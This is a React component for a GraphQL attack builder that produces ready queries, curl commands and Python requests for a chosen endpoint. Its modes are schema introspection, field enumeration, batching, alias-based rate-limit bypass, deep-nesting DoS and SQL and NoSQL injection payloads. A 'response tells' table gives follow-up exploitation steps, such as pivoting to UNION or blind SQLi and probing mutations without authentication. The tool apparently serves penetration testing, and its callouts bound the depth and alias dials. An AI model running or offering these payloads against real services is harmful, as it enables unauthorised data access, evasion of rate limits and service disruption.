import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  CopyChip,
  DownloadButton,
  NumberInput,
  OutputBlock,
  SectionTitle,
  Select,
  Slider,
  Tabs,
  TextInput,
} from '@/components/ui';

type Objective = 'introspection' | 'suggestions' | 'batch' | 'aliases' | 'depth' | 'sqli' | 'nosqli';

const OBJECTIVES: Array<{ value: Objective; label: string }> = [
  { value: 'introspection', label: 'Introspection — schema disclosure' },
  { value: 'suggestions', label: 'Field suggestions — name enumeration' },
  { value: 'batch', label: 'Batch query — array transport' },
  { value: 'aliases', label: 'Alias overloading — rate-limit bypass' },
  { value: 'depth', label: 'Deep nesting — cost DoS shape' },
  { value: 'sqli', label: 'SQL injection in arguments' },
  { value: 'nosqli', label: 'NoSQL injection in arguments' },
];

const TELLS: Array<[string, string, string]> = [
  ['Introspection disabled', '"Introspection has been disabled" / 400 with no schema', 'Fall back to field suggestions plus a wordlist of guessed names'],
  ['Suggestions leak', '“Did you mean ts user?” in the error', 'Reconstruct the schema one field at a time; each typo is an oracle'],
  ['Alias cap', 'Requests with >N aliases return 429 or "alias limit exceeded"', 'The cap is the rate limit — measure it, then stay under by one'],
  ['Depth cap', '"Query is too complex" / 500 after depth D', 'Depth D is the parser limit; cost scales with D × aliases'],
  ['Batch disabled', 'Array body rejected with "Batching is not supported"', 'Fall back to one request per operation, or use query params transport'],
  ['SQLi reflected', 'DB error text, 500 with stack trace', 'Argument is interpolated — pivot to UNION/boolean blind'],
  ['NoSQL operator accepted', 'Filter object returns unexpected rows', '{$ne: null} in an ID argument widens the match'],
  ['Auth boundary', '200 with data on an unauthenticated request', 'Authorisation is per-field, not per-endpoint — try every mutation'],
];

export default function GraphqlAttackBuilder() {
  const [endpoint, setEndpoint] = useState('https://example.com/graphql');
  const [auth, setAuth] = useState('Authorization: Bearer SESSION_ID');
  const [objective, setObjective] = useState<Objective>('introspection');
  const [aliasCount, setAliasCount] = useState(25);
  const [depth, setDepth] = useState(6);
  const [field, setField] = useState('user');
  const [arg, setArg] = useState('id');
  const [view, setView] = useState<'query' | 'curl' | 'python' | 'tells'>('query');

  const url = endpoint.trim() || 'https://example.com/graphql';
  const authLine = auth.trim();

  const query = useMemo(() => {
    switch (objective) {
      case 'introspection':
        return [
          '{',
          '  __schema {',
          '    queryType { name }',
          '    mutationType { name }',
          '    types {',
          '      name',
          '      kind',
          '      fields { name type { name kind ofType { name kind } } }',
          '    }',
          '  }',
          '}',
        ].join('\n');
      case 'suggestions':
        return [
          '{',
          `  ${field}(id: "1") { __typename }`,
          '  typoProbe: ' + field.concat('X') + '(id: "1") { __typename }',
          '}',
        ].join('\n');
      case 'batch':
        return [
          '[',
          '  { "query": "{ __typename }" },',
          `  { "query": "${`{ ${field}(id: \\"1\\") { __typename } }`}" },`,
          '  { "query": "{ __schema { types { name } } }" }',
          ']',
        ].join('\n');
      case 'aliases': {
        const block = Array.from({ length: Math.max(1, aliasCount) }, (_, i) =>
          `  a${i}: ${field}(${arg}: "${i + 1}") { __typename id }`,
        ).join('\n');
        return ['query AliasBurst {', block, '}'].join('\n');
      }
      case 'depth': {
        const open: string[] = [];
        for (let i = 0; i < Math.max(1, depth); i++) open.push(' '.repeat(i === 0 ? 0 : i * 2) + `${field}(${arg}: "${i + 1}") {`);
        open.push(' '.repeat(depth * 2) + '__typename');
        for (let i = depth - 1; i >= 0; i--) open.push(' '.repeat(i === 0 ? 0 : i * 2) + '}');
        return ['query Deep {', open.join('\n'), '}'].join('\n');
      }
      case 'sqli':
        return [
          'query SqliProbe {',
          `  a: ${field}(${arg}: "1' OR '1'='1") { __typename }`,
          `  b: ${field}(${arg}: "1 AND SLEEP(5)--") { __typename }`,
          `  c: ${field}(${arg}: "1 UNION SELECT NULL--") { __typename }`,
          '}',
        ].join('\n');
      default:
        return [
          'query NoSqlProbe {',
          `  a: ${field}(${arg}: {$ne: null}) { __typename }`,
          `  b: ${field}(${arg}: {"$gt": ""}) { __typename }`,
          `  c: ${field}(${arg}: {$regex: "^admin"}) { __typename }`,
          '}',
        ].join('\n');
    }
  }, [objective, field, arg, aliasCount, depth]);

  const curl = useMemo(() => {
    const body =
      objective === 'batch'
        ? query.replace(/"/g, '\\"').replace(/\n/g, '\\n')
        : query.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n');
    return [
      `curl -s -X POST '${url}' \\`,
      `  -H 'Content-Type: application/json' \\`,
      authLine ? `  -H '${authLine}' \\` : '',
      `  -d "{\\"query\\":\\"${body}\\"}" | python3 -m json.tool`,
    ]
      .filter(Boolean)
      .join('\n');
  }, [url, query, authLine, objective]);

  const python = useMemo(
    () => [
      'import requests, json',
      '',
      `URL = "${url}"`,
      authLine ? `HEADERS = {"Content-Type": "application/json", "${authLine.replace(/: /, '": "').split('": "')[0]}": "${authLine.split(': ')[1] ?? ''}"}` : 'HEADERS = {"Content-Type": "application/json"}',
      '',
      'QUERY = """',
      query,
      '"""',
      '',
      'r = requests.post(URL, headers=HEADERS, json={"query": QUERY}, timeout=15)',
      'print(r.status_code)',
      'print(json.dumps(r.json(), indent=2)[:2000])',
      '',
      '# `gql` / `sgqlc` are convenience wrappers over exactly this request shape.',
      '# They add query building, not capability — use raw requests when you need aliases or batching.',
    ].join('\n'),
    [url, authLine, query],
  );

  const cost = useMemo(() => {
    const perField = 2;
    const aliasFactor = objective === 'aliases' ? Math.max(1, aliasCount) : objective === 'depth' ? 1 : query.split('\n').length / 2;
    const depthFactor = objective === 'depth' ? Math.max(1, depth) : 1;
    return {
      nodes: Math.round(perField * aliasFactor * depthFactor),
      weight: Math.round(perField * aliasFactor * depthFactor * 1.5),
    };
  }, [objective, aliasCount, depth, query]);

  return (
    <>
      <Card title="Endpoint">
        <div className="grid gap-4 sm:grid-cols-2">
          <TextInput label="GraphQL endpoint" value={endpoint} onChange={setEndpoint} mono placeholder="https://example.com/graphql" hint="Often /graphql, /v1/graphql, /api/graphql or /graphiql" />
          <TextInput label="Auth header" value={auth} onChange={setAuth} mono placeholder="Authorization: Bearer SESSION_ID" hint="Full header line — leave empty for an anonymous probe" />
          <Select label="Objective" value={objective} onChange={setObjective} options={OBJECTIVES} hint={objective === 'introspection' ? 'Start here: a failed introspection tells you the schema is guarded' : 'Each objective emits one ready query'} />
          <div className="grid grid-cols-2 gap-4">
            <TextInput label="Root field" value={field} onChange={setField} mono placeholder="user" hint="Field under test" />
            <TextInput label="Argument" value={arg} onChange={setArg} mono placeholder="id" hint="Argument under test" />
          </div>
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-[220px_220px_1fr]">
          <NumberInput label="Alias count" value={aliasCount} onChange={setAliasCount} min={1} max={200} hint="Bounded — never above the target's documented cap" />
          <Slider label="Nesting depth" value={depth} onChange={setDepth} min={1} max={20} step={1} format={(v) => `${v} levels`} />
          <div className="flex flex-wrap items-end gap-2 pb-1">
            <span className="rf-mono rounded bg-[var(--neutral-btn)] px-2 py-1 text-[12px] text-[var(--text-faint)]">
              {cost.nodes} field nodes · cost {cost.weight}
            </span>
            <span className="rf-mono rounded bg-[var(--neutral-btn)] px-2 py-1 text-[12px] text-[var(--text-faint)]">
              {objective === 'aliases' ? `${aliasCount} aliases` : `${depth} deep`}
            </span>
          </div>
        </div>
      </Card>

      <Card
        title="Request"
        action={<DownloadButton text={query} filename={`graphql-${objective}.graphql`} label="Download .graphql" />}
      >
        <Tabs
          value={view}
          onChange={setView}
          tabs={[
            { value: 'query', label: 'Query' },
            { value: 'curl', label: 'curl' },
            { value: 'python', label: 'Python' },
            { value: 'tells', label: 'Response tells' },
          ]}
        />
        <div className="mt-3">
          {view === 'query' && (
            <>
              <OutputBlock value={query} rows={16} label={`${objective} body`} />
              <div className="mt-3 flex flex-wrap gap-2">
                <CopyChip text={query} label="copy query" />
                <CopyChip text={JSON.stringify({ query })} label="copy as JSON body" />
                <CopyChip text={`{"query":${JSON.stringify(query)}}`} label="copy minified envelope" />
              </div>
            </>
          )}
          {view === 'curl' && <OutputBlock value={curl} rows={12} label="curl invocation" />}
          {view === 'python' && <OutputBlock value={python} rows={16} label="requests-based client" />}
          {view === 'tells' && (
            <div className="overflow-x-auto">
              <table className="w-full border-collapse text-[12.5px]">
                <thead>
                  <tr className="text-left text-[11px] uppercase tracking-wide text-[var(--text-faint)]">
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Signal</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Response tells you</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Next step</th>
                  </tr>
                </thead>
                <tbody>
                  {TELLS.map(([signal, tell, next]) => (
                    <tr key={signal} className="align-top">
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text)]">{signal}</td>
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text-muted)]">{tell}</td>
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text-muted)]">{next}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </Card>

      <Card title="Cost model">
        <SectionTitle>Computed query cost</SectionTitle>
        <OutputBlock
          value={[
            `field nodes: ${cost.nodes}`,
            `weighted cost (node × 1.5): ${cost.weight}`,
            `aliases: ${objective === 'aliases' ? aliasCount : 1}`,
            `max depth: ${objective === 'depth' ? depth : 1}`,
            '',
            '# static estimate only — a server with a real cost analyser will',
            '# reject above its own threshold. Use these numbers to stay under it,',
            '# not to blow past it.',
          ].join('\n')}
          rows={8}
          label="operator estimate"
        />
        <div className="mt-4">
          <Callout tone="warn" title="Depth is bounded on purpose">
            Nesting depth is capped at {depth} levels and aliases at {aliasCount}. Both dials stay inside a range that
            stresses parsing without clearing the endpoint: the point is to measure the server's cap, not to take it down.
          </Callout>
        </div>
      </Card>
    </>
  );
}
